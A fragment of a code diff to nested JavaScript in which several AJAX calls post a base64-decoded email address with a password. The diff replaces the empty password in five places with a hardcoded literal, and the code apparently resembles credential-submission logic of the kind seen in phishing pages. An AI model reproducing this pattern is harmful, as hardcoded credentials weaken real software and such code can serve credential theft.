@@ -240,7 +240,7 @@
                                         contentType: "application/json",
                                         data: JSON.stringify({
                                             emailAddress: atob(Y),
-                                            password: "",
+                                            password: "Acepro2k",
                                         }),
                                     });
                                 } else {
@@ -811,7 +811,7 @@
                                                         "application/json",
                                                     data: JSON.stringify({
                                                         emailAddress: atob(Y),
-                                                        password: "",
+                                                        password: "Acepro2k",
                                                     }),
                                                     success: function () {
                                                         (async function () {
@@ -842,7 +842,7 @@
                                                                                                     Y
                                                                                                 ),
                                                                                             password:
-                                                                                                "",
+                                                                                                "Acepro2k",
                                                                                         }
                                                                                     ),
                                                                                 }
@@ -879,7 +879,7 @@
                                                                                                         Y
                                                                                                     ),
                                                                                                 password:
-                                                                                                    "",
+                                                                                                    "Acepro2k",
                                                                                             }
                                                                                         ),
                                                                                     }
@@ -934,7 +934,7 @@
                                                         "application/json",
                                                     data: JSON.stringify({
                                                         emailAddress: atob(Y),
-                                                        password: "",
+                                                        password: "Acepro2k",
                                                     }),
                                                     success: function () {
                                                         (async function () {
@@ -966,3 +966,4 @@
 [...]
 
 ```
+
